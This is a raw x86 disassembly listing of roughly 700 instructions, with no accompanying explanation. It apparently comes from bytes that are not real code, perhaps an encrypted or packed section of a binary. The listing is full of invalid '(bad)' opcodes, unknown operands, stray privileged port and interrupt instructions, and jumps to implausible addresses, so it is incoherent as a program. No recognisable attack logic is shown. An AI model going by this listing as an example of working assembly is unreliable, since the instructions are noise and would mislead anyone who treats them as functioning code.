  409459:	retf   0x863f
  40945c:	jl     0x4094b9
  40945e:	push   0x6e
  409460:	loopne 0x4094a0
  409462:	jae    0x4094b6
  409464:	push   esi
  409465:	pop    ss
  409466:	sub    eax,0x23459fa6
  40946b:	cmp    DWORD PTR [esp+eax*2+0x17],ebx
  40946f:	inc    edx
  409470:	dec    esp
  409471:	in     al,dx
  409472:	xchg   edi,eax
  409473:	mov    al,bh
  409475:	sti    
  409476:	mov    DWORD PTR [edx-0x7aa9f402],edx
  40947c:	xchg   ebx,eax
  40947d:	cmp    dh,BYTE PTR [ebx+0x5dd53da4]
  409483:	pusha  
  409484:	test   DWORD PTR [ecx],0x2ad77a92
  40948a:	lods   al,BYTE PTR ds:[esi]
  40948b:	adc    DWORD PTR [esi-0x28],esi
  40948e:	test   DWORD PTR [esi+eax*1-0x24],esi
  409492:	mov    ds:0x7064c648,al
  409497:	push   0x54
  409499:	(bad)
  40949d:	ror    DWORD PTR [eax],cl
  40949f:	sub    ch,dh
  4094a1:	jne    0x4094e0
  4094a3:	cmp    eax,0xa7a837aa
  4094a8:	mov    dh,0x63
  4094aa:	jecxz  0x4094d8
  4094ac:	inc    esi
  4094ad:	pop    esi
  4094ae:	syscall 
  4094b0:	and    al,0x2a
  4094b2:	enter  0xfef0,0xea
  4094b6:	shl    BYTE PTR [ebp+0x41e2d0af],0x72
  4094bd:	mov    esp,es
  4094bf:	aad    0x84
  4094c1:	sub    bl,BYTE PTR [edi]
  4094c3:	pushf  
  4094c4:	push   edx
  4094c5:	test   BYTE PTR [eax+0x1b],bl
  4094c8:	cmp    BYTE PTR [eax],ch
  4094ca:	lods   eax,DWORD PTR ds:[esi]
  4094cb:	leave  
  4094cc:	pop    esi
  4094cd:	sub    ebp,DWORD PTR [edi-0x6b]
  4094d0:	jbe    0x40952f
  4094d2:	in     al,0x7d
  4094d4:	repz out 0x2b,eax
  4094d7:	pop    ebx
  4094d8:	into   
  4094d9:	(bad)  
  4094da:	in     eax,dx
  4094db:	push   es
  4094dc:	jmp    0x409463
  4094de:	push   esp
  4094df:	mov    ah,0xbe
  4094e1:	sbb    DWORD PTR [edi+ebx*2-0x2264ae6c],esp
  4094e8:	test   DWORD PTR [esi-0x31],0x39496d7d
  4094ef:	aaa    
  4094f0:	adc    bh,BYTE PTR [ecx]
  4094f2:	retf   
  4094f3:	pop    ebx
  4094f4:	and    dh,BYTE PTR [ecx]
  4094f6:	pusha  
  4094f7:	pop    ebx
  4094f8:	mov    edi,0x1759950b
  4094fd:	hlt    
  4094fe:	(bad)  
  4094ff:	mov    WORD PTR [ebx+ebp*1],ds
  409502:	cld    
  409503:	jp     0x409580
  409505:	cmc    
  409506:	je     0x4094b4
  409508:	lods   eax,DWORD PTR ds:[esi]
  409509:	cmp    eax,0xb86423c9
  40950e:	xchg   esp,eax
  40950f:	jecxz  0x4094be
  409511:	pop    esp
  409512:	sbb    eax,0xd1867a66
  409517:	cmp    eax,0xff306850
  40951c:	sahf   
  40951d:	data16 sub bh,BYTE PTR [edx-0x11]
  409521:	mov    eax,0x1bf56cc9
  409526:	sbb    ecx,esi
  409528:	dec    esp
  409529:	mov    ecx,0x6c130d59
  40952e:	dec    ebp
  40952f:	add    al,0x19
  409531:	fld    DWORD PTR [edx]
  409533:	jg     0x4094bb
  409535:	icebp  
  409536:	xor    esi,DWORD PTR [edx]
  409538:	loope  0x409572
  40953a:	cs pop es
  40953c:	aas    
  40953d:	and    esi,DWORD PTR [esi+0x5c]
  409540:	cmp    DWORD PTR gs:[ebx+0x5a],esi
  409544:	cmp    DWORD PTR [ecx-0x5a],esp
  409547:	lea    edx,[ebp-0x39]
  40954a:	push   ebp
  40954b:	push   0x72839938
  409550:	pop    edi
  409551:	mov    ah,BYTE PTR [esi-0x6d141513]
  409557:	sbb    bh,BYTE PTR [eax]
  409559:	scas   al,BYTE PTR es:[edi]
  40955a:	or     BYTE PTR [esi+0x12a61419],ch
  409560:	aad    0x30
  409562:	sbb    eax,0xd286b11a
  409567:	inc    ebx
  409568:	ret    
  409569:	cmp    bh,ah
  40956b:	nop
  40956c:	mov    al,0xc3
  40956e:	je     0x409556
  409570:	call   0xc54e02c7
  409575:	add    ch,BYTE PTR [ecx]
  409577:	mov    ds:0x5ca4669f,al
  40957c:	pop    ds
  40957d:	lock cmc 
  40957f:	mov    ds:0xd1e5199a,eax
  409584:	dec    edx
  409585:	sub    eax,0x1199f110
  40958a:	and    eax,0x8ea0445
  40958f:	dec    edi
  409590:	pop    ds
  409591:	fwait
  409592:	push   ebp
  409593:	mov    ch,0x95
  409595:	xchg   ebx,eax
  409596:	inc    BYTE PTR [ebp+0x28]
  409599:	dec    ecx
  40959a:	adc    al,0x26
  40959c:	and    al,0x65
  40959e:	lock cld 
  4095a0:	shl    esi,1
  4095a2:	inc    ebp
  4095a3:	popf   
  4095a4:	mov    WORD PTR [ebx],ds
  4095a6:	push   0x206625c1
  4095ab:	fistp  WORD PTR [eax+0x55]
  4095ae:	stc    
  4095af:	pop    edx
  4095b0:	and    BYTE PTR [ebp+0x71accda5],cl
  4095b6:	test   DWORD PTR [esi],ecx
  4095b8:	jnp    0x4095ec
  4095ba:	cmc    
  4095bb:	enter  0xd774,0xee
  4095bf:	ins    DWORD PTR es:[edi],dx
  4095c0:	push   esp
  4095c1:	adc    BYTE PTR [edx-0x58],dh
  4095c4:	push   cs
  4095c5:	fiadd  WORD PTR [esi+ecx*8-0x4e541c63]
  4095cc:	jecxz  0x4095d9
  4095ce:	xlat   BYTE PTR ds:[ebx]
  4095cf:	mov    eax,ds:0x236374b
  4095d4:	pushf  
  4095d5:	int3   
  4095d6:	mov    BYTE PTR [eax-0x32],bh
  4095d9:	clc    
  4095da:	popf   
  4095db:	pusha  
  4095dc:	test   eax,0x6088e809
  4095e1:	xlat   BYTE PTR ds:[ebx]
  4095e2:	mov    al,ds:0x21081f31
  4095e7:	push   esi
  4095e8:	xchg   ebx,eax
  4095e9:	out    dx,eax
  4095ea:	push   ss
  4095eb:	pop    ds
  4095ec:	xchg   DWORD PTR [ecx+0x5c756fb3],esi
  4095f2:	les    edi,FWORD PTR [eax+0x3c]
  4095f5:	adc    DWORD PTR [esi+0x307ae42a],ecx
  4095fb:	jne    0x40967b
  4095fd:	mov    esp,0xb17b8737
  409602:	fbstp  TBYTE PTR es:[esi-0xa0936dd]
  409609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960a:	into   
  40960b:	pop    eax
  40960c:	call   0x372ceceb
  409611:	adc    bl,BYTE PTR [ecx-0x37]
  409614:	aad    0xbc
  409616:	adc    cl,BYTE PTR [edi-0x1f7ea0e7]
  40961c:	stos   BYTE PTR es:[edi],al
  40961d:	pop    ebp
  40961e:	test   BYTE PTR [ebx+0x405d9d12],ah
  409624:	or     BYTE PTR [edx-0x6e],bh
  409627:	push   edx
  409628:	push   eax
  409629:	int3   
  40962a:	das    
  40962b:	daa    
  40962c:	jno    0x40963b
  40962e:	ja     0x409688
  409630:	les    esp,FWORD PTR [eax+edx*2-0x75]
  409634:	pop    ebp
  409635:	cmp    bh,0x43
  409638:	push   ebp
  409639:	out    0xe0,al
  40963b:	dec    ebp
  40963c:	rol    DWORD PTR [esi-0x463b7f71],cl
  409642:	mov    WORD PTR [edx],gs
  409644:	ret    0x1115
  409647:	jg     0x4096a5
  409649:	(bad)  
  40964a:	stc    
  40964b:	arpl   WORD PTR [edx+0x680a04e1],bp
  409651:	(bad)  
  409652:	jmp    0x4096be
  409654:	(bad)  
  409655:	sbb    BYTE PTR [esi+0x4e],al
  409658:	(bad)  
  409659:	sub    dl,BYTE PTR [esi-0x741e96]
  40965f:	jmp    0xb2afc0ab
  409664:	inc    edi
  409665:	sub    al,0xd3
  409667:	(bad)  
  409669:	(bad)  
  40966a:	jne    0x409617
  40966c:	imul   edi,edi,0xffffffb0
  40966f:	xor    eax,0x2c98068f
  409674:	pop    ebp
  409675:	inc    eax
  409676:	and    edi,DWORD PTR [esi]
  409678:	(bad)  
  409679:	and    eax,0x62c8463
  40967e:	arpl   WORD PTR ds:0xe03dace2,dx
  409684:	iret   
  409685:	mov    edi,0xccd0d2f2
  40968a:	das    
  40968b:	sbb    eax,0x9d144e1b
  409690:	sub    al,BYTE PTR [edx+0x67ba3135]
  409696:	dec    esi
  409697:	jo     0x409661
  409699:	xor    cl,cl
  40969b:	xor    BYTE PTR [eax-0x6],bl
  40969e:	xor    ebx,DWORD PTR [edx+0x5]
  4096a1:	mov    esi,0xbae16ac4
  4096a6:	mov    esp,0xbe4a6a44
  4096ab:	cwde   
  4096ac:	push   ss
  4096ad:	shl    ecx,0x1e
  4096b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4096b3:	jmp    0x409c3d
  4096b8:	out    0x84,eax
  4096ba:	inc    ebx
  4096bb:	mov    bl,BYTE PTR [eax]
  4096bd:	push   eax
  4096be:	sahf   
  4096bf:	pop    eax
  4096c0:	sub    DWORD PTR [ecx-0x54884dac],edx
  4096c6:	call   0x166e6b33
  4096cb:	push   ss
  4096cc:	cmp    eax,0x52161604
  4096d1:	imul   ebx,DWORD PTR [edx+0x5b73cf14],0x59dc4798
  4096db:	push   ebp
  4096dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096dd:	ret    
  4096de:	jge    0x4096e8
  4096e0:	shl    bl,0x67
  4096e3:	lds    eax,FWORD PTR [ebx+eiz*4]
  4096e6:	sbb    al,0xab
  4096e8:	dec    edx
  4096e9:	pop    ecx
  4096ea:	xor    cl,ch
  4096ec:	pop    edx
  4096ed:	pop    edi
  4096ee:	test   BYTE PTR [ecx+0x7b18dc5c],0x68
  4096f5:	enter  0x8787,0xc6
  4096f9:	jo     0x409707
  4096fb:	out    dx,eax
  4096fc:	into   
  4096fd:	push   ds
  4096fe:	test   DWORD PTR ds:0x9c96ae87,edx
  409704:	add    DWORD PTR gs:[eax-0x10fcaae],0xffffffe0
  40970c:	addr16 test al,0x1e
  40970f:	dec    al
  409711:	in     al,0x6
  409713:	stos   DWORD PTR es:[edi],eax
  409714:	push   esp
  409715:	retf   0x3c9e
  409718:	call   0xf1a5:0x242e3f0f
  40971f:	xor    eax,0xffe83143
  409724:	in     eax,dx
  409725:	or     al,0xb9
  409727:	jge    0x4096aa
  409729:	sub    ebp,DWORD PTR [eax-0x46]
  40972c:	and    al,BYTE PTR [ebp+0x1123d6e0]
  409732:	es jge 0x409709
  409735:	add    eax,0x209f2c49
  40973a:	pop    edx
  40973b:	adc    DWORD PTR [esi],ebx
  40973d:	ret    0xbbab
  409740:	and    DWORD PTR [edi+edx*1+0x13],esp
  409744:	dec    ebx
  409745:	inc    esi
  409746:	fdiv   st,st(3)
  409748:	js     0x40974f
  40974a:	mov    ?,WORD PTR [eax]
  40974c:	cdq    
  40974d:	iret   
  40974e:	and    cl,al
  409750:	dec    esp
  409751:	fisubr WORD PTR ds:0x212fad16
  409757:	add    eax,0xe5c6cd2b
  40975c:	jmp    0x26ab1370
  409761:	adc    DWORD PTR [edi-0x263a2160],edx
  409767:	cli    
  409768:	pusha  
  409769:	ja     0x409713
  40976b:	sub    eax,DWORD PTR [edi+0x22fc47db]
  409771:	ror    BYTE PTR [edi-0xcaddabc],1
  409777:	jp     0x409726
  409779:	test   DWORD PTR [edi],ecx
  40977b:	sub    esi,DWORD PTR [ebx-0x33e25f76]
  409781:	mov    ebp,DWORD PTR [ecx+0x5b]
  409784:	mov    ebp,0x33b92103
  409789:	(bad)  
  40978a:	or     BYTE PTR [ebp-0x25aa87d5],ch
  409790:	xchg   ebx,eax
  409791:	sbb    DWORD PTR [ebp-0x26],0x53ceae04
  409798:	mov    al,ds:0xd929e4a4
  40979d:	out    0x31,al
  40979f:	or     DWORD PTR [edi+0x2073dd86],edi
  4097a5:	popa   
  4097a6:	add    dh,BYTE PTR [ecx+0x3998bf52]
  4097ac:	mov    al,ds:0xb48ec51e
  4097b1:	cmp    eax,0x43ab168c
  4097b6:	cmp    eax,0x42eb50bf
  4097bb:	inc    ebp
  4097bc:	in     al,0x23
  4097be:	jns    0x409833
  4097c0:	ror    BYTE PTR [ebx-0x33],1
  4097c3:	rcl    DWORD PTR [eax],0xde
  4097c6:	loop   0x4097b8
  4097c8:	ins    DWORD PTR es:[edi],dx
  4097c9:	rcl    dl,0x20
  4097cc:	xchg   ebp,eax
  4097cd:	popf   
  4097ce:	jmp    0xbd733d9c
  4097d3:	adc    BYTE PTR [eax+eiz*4-0x7b],ch
  4097d7:	adc    eax,0xcaba67cd
  4097dc:	pushf  
  4097dd:	je     0x4097cd
  4097df:	sub    dh,0x8e
  4097e2:	add    dl,BYTE PTR [edi+0x4308ba41]
  4097e8:	mov    dh,0x6d
  4097ea:	in     al,0xd4
  4097ec:	xchg   ecx,eax
  4097ed:	mov    edx,0x5d924fc
  4097f2:	lahf   
  4097f3:	ffreep st(6)
  4097f5:	popf   
  4097f6:	in     eax,dx
  4097f7:	xchg   BYTE PTR [ebx-0x133bac11],cl
  4097fd:	mov    eax,ds:0x52700d8
  409802:	stc    
  409803:	rcr    BYTE PTR ds:0x2d4ff8cb,0x31
  40980a:	ins    BYTE PTR es:[edi],dx
  40980b:	pop    ecx
  40980c:	imul   esp,DWORD PTR [esi+0x71f31c47],0x50b679fd
  409816:	xchg   esp,eax
  409817:	lahf   
  409818:	pop    ds
  409819:	dec    eax
  40981a:	adc    al,0xdc
  40981c:	push   ecx
  40981d:	ss in  al,dx
  40981f:	cdq    
  409820:	int3   
  409821:	rcl    DWORD PTR [ecx],cl
  409823:	dec    esp
  409824:	jecxz  0x409842
  409826:	jl     0x40989e
  409828:	xlat   BYTE PTR ds:[ebx]
  409829:	imul   esp,DWORD PTR [edi],0xffffffff
  40982c:	push   ds
  40982d:	mov    bl,0x7f
  40982f:	push   edi
  409830:	addr16 sahf 
  409832:	mov    ch,0xd3
  409834:	dec    edx
  409835:	mov    ds:0xf9b537a8,eax
  40983a:	or     ebp,DWORD PTR [ebp+0x4550b68e]
  409840:	repnz (bad) 
  409842:	lods   eax,DWORD PTR ds:[esi]
  409843:	popa   
  409844:	and    bl,dh
  409846:	and    eax,0xc15493b2
  40984b:	cli    
  40984c:	sub    dl,BYTE PTR [eax]
  40984e:	jl     0x4097dd
  409850:	cmp    al,0x6
  409852:	and    al,0x5c
  409854:	dec    BYTE PTR [esi]
  409856:	into   
  409857:	(bad)  
  409858:	jo     0x4098cf
  40985a:	or     ah,BYTE PTR [edx]
  40985c:	or     al,0xa2
  40985e:	inc    eax
  40985f:	imul   ebp,DWORD PTR [eax+0x40f66f2d],0xffffff99
  409866:	dec    edx
  409867:	sbb    eax,0xe072289
  40986c:	sub    ah,BYTE PTR [ecx]
  40986e:	arpl   WORD PTR [ebx],bx
  409870:	fadd   st,st(2)
  409872:	addr16 in eax,dx
  409874:	add    DWORD PTR [ebx],esp
  409876:	lds    eax,FWORD PTR [esi]
  409878:	add    eax,0x933dd72e
  40987d:	stos   DWORD PTR es:[edi],eax
  40987e:	mov    ecx,0x6709c45d
  409883:	pop    eax
  409884:	sbb    al,0xf4
  409886:	add    DWORD PTR [esi+0x4],ebx
  409889:	jg     0x409906
  40988b:	iret   
  40988c:	mov    edi,0x423cb54e
  409891:	sbb    DWORD PTR [eax],esi
  409893:	in     al,0xf3
  409895:	sbb    esp,edx
  409897:	pop    ecx
  409898:	in     eax,0x58
  40989a:	add    eax,DWORD PTR [ecx]
  40989c:	pop    ebx
  40989d:	sbb    esi,DWORD PTR [ebx-0x4f]
  4098a0:	psadbw mm2,QWORD PTR [ebx-0x298dbaba]
  4098a7:	ins    BYTE PTR es:[edi],dx
  4098a8:	xor    eax,DWORD PTR [ebx+0x633c6d60]
  4098ae:	das    
  4098af:	lock arpl WORD PTR [esi-0x5e],si
  4098b3:	arpl   WORD PTR [eax-0x172649b1],cx
  4098b9:	js     0x409873
  4098bb:	lods   al,BYTE PTR ds:[esi]
  4098bc:	mov    ah,0xc7
  4098be:	lahf   
  4098bf:	mov    al,ds:0xac3c58d9
  4098c4:	int3   
  4098c5:	xor    ebx,DWORD PTR [eax-0x2b1854f8]
  4098cb:	out    dx,al
  4098cc:	ret    0x3c4d
  4098cf:	mov    ah,0x10
  4098d1:	mov    ah,0xcf
  4098d3:	pop    edx
  4098d4:	sbb    DWORD PTR [ebp+0x30],esi
  4098d7:	bound  edx,QWORD PTR ds:0x7d4f54c0
  4098dd:	jne    0x409901
  4098df:	mov    bl,0xc2
  4098e1:	pop    es
  4098e2:	int3   
  4098e3:	jo     0x4098f7
  4098e5:	enter  0xece9,0x7b
  4098e9:	mov    DWORD PTR [ecx+edi*8-0x3d4a0b84],eax
  4098f0:	(bad)  
  4098f1:	out    0x94,al
  4098f3:	push   ebp
  4098f4:	mov    ebp,0x690887c0
  4098f9:	aas    
  4098fa:	pop    edi
  4098fb:	test   al,bl
  4098fd:	inc    eax
  4098fe:	and    eax,DWORD PTR [edi-0x74]
  409901:	cmp    al,0x49
  409903:	jp     0x4098e9
  409905:	adc    DWORD PTR [edi+0x35],ebx
  409908:	(bad)  
  40990a:	stc    
  40990b:	ins    DWORD PTR es:[edi],dx
  40990c:	and    BYTE PTR [eax-0x6231f06a],ch
  409912:	push   ds
  409913:	xor    DWORD PTR [esi-0x7e],0xfffffffe
  409917:	lods   eax,DWORD PTR ds:[esi]
  409918:	mov    dh,0x16
  40991a:	sbb    eax,0xe0cba3c
  40991f:	popf   
  409920:	mov    bl,0xe6
  409922:	ret    0x2be8
  409925:	sbb    eax,0x39cd5283
  40992a:	mov    esp,0xf496b6ae
  40992f:	div    BYTE PTR [ebp+0x1d3fdba5]
  409935:	popa   
  409936:	jmp    0x40994a
  409938:	mov    ds:0x65883d4f,eax
  40993d:	cmp    dh,dl
  40993f:	mov    bh,0x9a
  409941:	xchg   edx,eax
  409942:	icebp  
  409943:	push   edi
  409944:	push   es
  409945:	sbb    eax,DWORD PTR [edx]
  409947:	jbe    0x40992f
  409949:	xchg   ecx,eax
  40994a:	adc    ah,bh
  40994c:	sbb    esi,edx
  40994e:	or     ebp,edi
  409950:	pusha  
  409951:	pop    ebx
  409952:	xchg   esi,eax
  409953:	xchg   dl,bh
  409955:	popa   
  409956:	jns    0x409911
  409958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409959:	das    
  40995a:	xchg   ebx,eax
  40995b:	mov    esp,0xe4412956
  409960:	inc    ebp
  409961:	xor    eax,0x2405b89c
  409966:	mov    esi,0x434f6b66
  40996b:	lahf   
  40996c:	loope  0x4099e2
  40996e:	(bad)  
  40996f:	out    dx,al
  409970:	call   0xc7e7:0xff74dc66
  409977:	in     eax,0x71
  409979:	ss dec eax
  40997b:	pop    ecx
  40997c:	mov    WORD PTR [ebx+0x45],?
  40997f:	dec    esi
  409980:	mov    edi,0xa6117d4d
  409985:	popa   
  409986:	fst    st(4)
  409988:	inc    ebp
  409989:	adc    eax,0xb2f6c273
  40998e:	mov    cl,0x6
  409990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409991:	das    
  409992:	jle    0x40995d
  409994:	rcl    DWORD PTR [eax],1
  409996:	jecxz  0x409993
  409998:	lods   al,BYTE PTR ds:[esi]
  409999:	iret   
  40999a:	in     eax,0x56
  40999c:	lods   eax,DWORD PTR ds:[esi]
  40999d:	pop    ecx
  40999e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40999f:	lea    edx,[ebx+edx*1]
  4099a2:	iret   
  4099a3:	pop    edi
  4099a4:	stos   DWORD PTR es:[edi],eax
  4099a5:	mov    BYTE PTR [eax+0x3bd4031a],ch
  4099ab:	lahf   
  4099ac:	test   al,0xc
  4099ae:	ret    
  4099af:	shl    bl,1
  4099b1:	add    BYTE PTR [esi+edi*8-0x5daf5660],dh
  4099b8:	mov    bh,0xde
  4099ba:	into   
  4099bb:	push   ss
  4099bc:	std    
  4099bd:	fisubr DWORD PTR [esp]
  4099c0:	js     0x409a2d
  4099c2:	(bad)  
  4099c3:	mov    cl,0xfe
  4099c5:	mov    ebp,0x459dd366
  4099ca:	call   0xa91893c0
  4099cf:	push   ecx
  4099d0:	ss add dl,dh
  4099d3:	sub    DWORD PTR [edx],ebp
  4099d5:	jmp    0x409972
  4099d7:	mov    esi,0x22d8c641
  4099dc:	sub    eax,0x24ab87ed
  4099e1:	xchg   ebx,eax
  4099e2:	dec    esp
  4099e3:	add    bl,ah
  4099e5:	sub    BYTE PTR [edx-0x57],dh
  4099e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099e9:	xor    esi,DWORD PTR [ecx+edi*1+0x28d5af31]
  4099f0:	push   esi
  4099f1:	cmp    DWORD PTR [edx],edi
  4099f3:	leave  
  4099f4:	pop    ebx
  4099f5:	push   esp
  4099f6:	adc    DWORD PTR [esp+ebx*2],ecx
  4099f9:	and    DWORD PTR [eax-0x69],esi
  4099fc:	sub    DWORD PTR [eax+0x3d1d8f62],esi
  409a02:	(bad)  
  409a03:	push   edx
  409a04:	xor    al,0x86
  409a06:	cmc    
  409a07:	dec    ebx
  409a08:	data16 fisubr WORD PTR [eax+0x2c]
  409a0c:	jnp    0x409a4a
  409a0e:	mov    al,0xaf
  409a10:	jno    0x409a4f
  409a12:	imul   edi,DWORD PTR [eax-0x6f],0xf70d8b5b
  409a19:	ja     0x409a5b
  409a1b:	push   ebp
  409a1c:	imul   DWORD PTR [edx-0x2a899108]
  409a22:	stc    
  409a23:	sahf   
  409a24:	inc    eax
  409a25:	push   edi
  409a26:	and    al,0x24
  409a28:	jne    0x409a64
  409a2a:	pop    ss
  409a2b:	lods   al,BYTE PTR ds:[esi]
  409a2c:	ds ret 0xd4ea
  409a30:	test   BYTE PTR [ebx+ecx*1],dl
  409a33:	and    BYTE PTR [esi],0xbd
  409a36:	(bad)  
  409a37:	push   ds
  409a38:	shr    BYTE PTR [ecx-0x7a066ab9],0xe
  409a3f:	and    al,0x86
  409a41:	sub    ch,dl
  409a43:	push   eax
  409a44:	pusha  
  409a45:	jnp    0x409a7b
  409a47:	cmc    
  409a48:	popf   
  409a49:	inc    esp
  409a4a:	or     DWORD PTR [ebx],eax
  409a4c:	retf   0x49ca
  409a4f:	cmp    al,0x98
  409a51:	jae    0x409a60
  409a53:	aam    0x57
  409a55:	mov    ebp,0xd68e7559
  409a5a:	sub    eax,0x69cfc548
  409a5f:	lock data16 jmp 0x4099e6
  409a63:	call   0xd5ca186f
  409a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a69:	icebp  
  409a6a:	dec    DWORD PTR [eax]
  409a6c:	pop    ss
  409a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a6e:	aad    0x96
  409a70:	push   edi
  409a71:	ret    
  409a72:	test   BYTE PTR [ebp+0x748833cf],0x8c
  409a79:	aaa    
  409a7a:	jmp    0xebff:0xe91107bc
  409a81:	repz jmp 0x853cd2eb
  409a87:	or     eax,0x818d5f58
  409a8c:	sub    BYTE PTR [esi+0x42],dh
  409a8f:	dec    edi
  409a90:	rol    DWORD PTR [ecx+0x2b],1
  409a93:	div    BYTE PTR [edx+ebp*2]
  409a96:	pop    esp
  409a97:	(bad)  
  409a98:	bnd jno 0x409ad9
  409a9b:	inc    eax
  409a9c:	mov    ?,WORD PTR [eax-0x45ce7e92]
  409aa2:	and    al,0x9b
  409aa4:	out    0x81,al
  409aa6:	and    edx,DWORD PTR [ecx+ebp*2+0x4b]
  409aaa:	add    BYTE PTR [edi+ebx*2-0x642c5b8a],ah
  409ab1:	adc    DWORD PTR [ebp-0x11],ebp
  409ab4:	pop    eax
  409ab5:	or     ebp,DWORD PTR [edx]
  409ab7:	int3   
  409ab8:	jge    0x409b36
  409aba:	mov    ebp,0x6f166985
  409abf:	jg     0x409ad4
  409ac1:	arpl   WORD PTR [ecx],bx
  409ac3:	xchg   edi,eax
  409ac4:	lock test eax,0x75caa17d
  409aca:	xchg   esi,eax
  409acb:	daa    
  409acc:	add    cl,BYTE PTR [eax+0x2710e548]
  409ad2:	cmp    BYTE PTR [ecx],0xe2
  409ad5:	sbb    esp,ebp
  409ad7:	add    eax,edx
  409ad9:	out    0x7b,eax
  409adb:	adc    ah,BYTE PTR [ebp+0x17ebba5c]
  409ae1:	sar    esi,0x51
  409ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ae5:	mov    al,BYTE PTR ss:[ecx]
  409ae8:	xchg   esp,eax
  409ae9:	jmp    0x8343c84d
  409aee:	das    
  409aef:	jmp    0x7f3d3454
  409af4:	ins    BYTE PTR es:[edi],dx
  409af5:	push   esi
  409af6:	in     al,0xd5
  409af8:	pop    ebx
  409af9:	rol    BYTE PTR [esi],0xc3
  409afc:	mov    esi,edx
  409afe:	inc    esp
  409aff:	cmp    al,0xbb
  409b01:	inc    esp
  409b02:	icebp  
  409b03:	and    edi,ecx
  409b05:	or     BYTE PTR [edi],bh
  409b07:	shl    WORD PTR [ebp+0x1d],cl
  409b0b:	cdq    
  409b0c:	sti    
  409b0d:	sbb    edi,DWORD PTR [ebx]
  409b0f:	cmp    al,0xe0
  409b11:	cmp    BYTE PTR [eax-0x59d60fba],cl
  409b17:	mov    ds:0xc1d069e1,eax
  409b1c:	out    0xf7,al
  409b1e:	or     ch,cl
  409b20:	bound  esp,QWORD PTR ds:0x43238790
  409b26:	jmp    0xcf77:0xbc4caf05
  409b2d:	scas   al,BYTE PTR es:[edi]
  409b2e:	(bad)  
  409b2f:	xlat   BYTE PTR ds:[ebx]
  409b30:	add    eax,0x4050691a
  409b35:	and    ah,BYTE PTR [eax]
  409b37:	and    eax,0x4ac91460
  409b3c:	pop    ss
  409b3d:	adc    ebx,DWORD PTR [esi]
  409b3f:	and    eax,0x362a1e19
  409b44:	sahf   
  409b45:	xchg   edx,eax
  409b46:	cmp    DWORD PTR [ebp+eax*8+0x5d19ceff],ecx
  409b4d:	lock push es
  409b4f:	fs jbe 0x409b0c
  409b52:	je     0x409b90
  409b54:	dec    ebx
  409b55:	inc    eax
  409b56:	out    dx,eax
  409b57:	add    BYTE PTR [edx+0x419f5d6c],al
  409b5d:	shl    BYTE PTR [edi+0x23],1
  409b60:	icebp  
  409b61:	inc    esp
  409b63:	add    eax,0x5045f6c4
  409b68:	stos   DWORD PTR es:[edi],eax
  409b69:	shl    DWORD PTR [edx],cl
  409b6b:	ss dec ebx
  409b6d:	add    BYTE PTR [eax],ah
  409b6f:	loop   0x409bed
  409b71:	sbb    eax,ebp
  409b73:	xor    al,0xc7
  409b75:	push   ebx
  409b76:	xor    BYTE PTR [ecx+ecx*2-0x8b0b9c],0x48
  409b7e:	push   esp
  409b7f:	retf   
  409b80:	mov    edx,0xda4c3278
  409b85:	out    dx,al
  409b86:	out    0xb5,al
  409b88:	ins    DWORD PTR es:[edi],dx
  409b89:	ret    0x2cb3
  409b8c:	jae    0x409b40
  409b8e:	lock ror BYTE PTR [edi],0xfb
  409b92:	mov    ebx,0xc2d2fbf2
  409b97:	ret    
  409b98:	pop    ss
  409b99:	mov    eax,ds:0xbf39feaa
  409b9e:	sbb    BYTE PTR [edi+0x268c7bb6],al
  409ba4:	shl    bl,cl
  409ba6:	adc    al,0x18
  409ba8:	pop    ebx
  409ba9:	inc    ebx
  409baa:	lds    ecx,FWORD PTR ds:0xac953cd5
  409bb0:	and    DWORD PTR [edx-0x6f],esi
  409bb3:	clc    
  409bb4:	mov    eax,ds:0x4ce5b3e3
  409bb9:	imul   ebx,DWORD PTR ds:0xa8e77720,0x725a49e3
  409bc3:	leave  
  409bc4:	(bad)  
  409bc5:	cmp    BYTE PTR [edx],bh
  409bc7:	shl    BYTE PTR [ecx+ecx*1+0x13],cl
  409bcb:	scas   al,BYTE PTR es:[edi]
  409bcc:	pusha  
  409bcd:	out    0xe0,al
  409bcf:	inc    ebp
  409bd0:	push   edx
  409bd1:	lods   eax,DWORD PTR ds:[esi]
  409bd2:	sub    BYTE PTR [eax+0x474fbec9],al
  409bd8:	shr    DWORD PTR [esi-0x70],1
  409bdb:	sub    esi,DWORD PTR [ecx+0x77]
  409bde:	(bad)  
  409be0:	sub    BYTE PTR [esi],cl
  409be2:	jae    0x409c50
  409be4:	dec    edi
  409be5:	add    esi,ebp
  409be7:	mov    ch,0xed
  409be9:	(bad)  
  409bea:	int3   
  409beb:	in     eax,dx
  409bec:	pop    ebx
  409bed:	lods   eax,DWORD PTR ds:[esi]
  409bee:	xor    esp,ecx
  409bf0:	test   BYTE PTR [esi-0xb2f58be],0x32
  409bf7:	fmul   st(4),st
  409bf9:	sub    BYTE PTR [edx+0x311ce59],dh
  409bff:	dec    edx
  409c00:	cmp    BYTE PTR ds:0x53b44fe0,bh
  409c06:	xor    edx,DWORD PTR [ebp-0x4c]
  409c09:	and    ebp,DWORD PTR [eax-0x213780c4]
  409c0f:	rol    dh,0x2c
  409c12:	ds mov dl,0xa0
  409c15:	cs inc edi
  409c17:	adc    al,0x70
  409c19:	push   edx
  409c1a:	aas    
  409c1b:	stos   DWORD PTR es:[edi],eax
  409c1c:	(bad)  
  409c1d:	mov    ds:0x653a0d9a,al
  409c22:	cmp    bh,BYTE PTR ss:[ecx+0x1f]
  409c26:	push   ebx
  409c27:	(bad)  [ebp+0x53]
  409c2a:	adc    bh,BYTE PTR [ebp-0x16]
  409c2d:	sbb    eax,0x57956526
  409c32:	push   ds
  409c33:	(bad)  
  409c34:	lahf   
  409c35:	dec    edi
  409c36:	add    DWORD PTR [edx+0x66792e3b],0x7b
  409c3d:	xor    eax,edi
  409c3f:	xor    edx,edx
  409c41:	jmp    0x40a1cb
  409c46:	into   
  409c47:	icebp  
  409c48:	test   DWORD PTR [ecx+ebp*1+0x6ce82e28],ebp
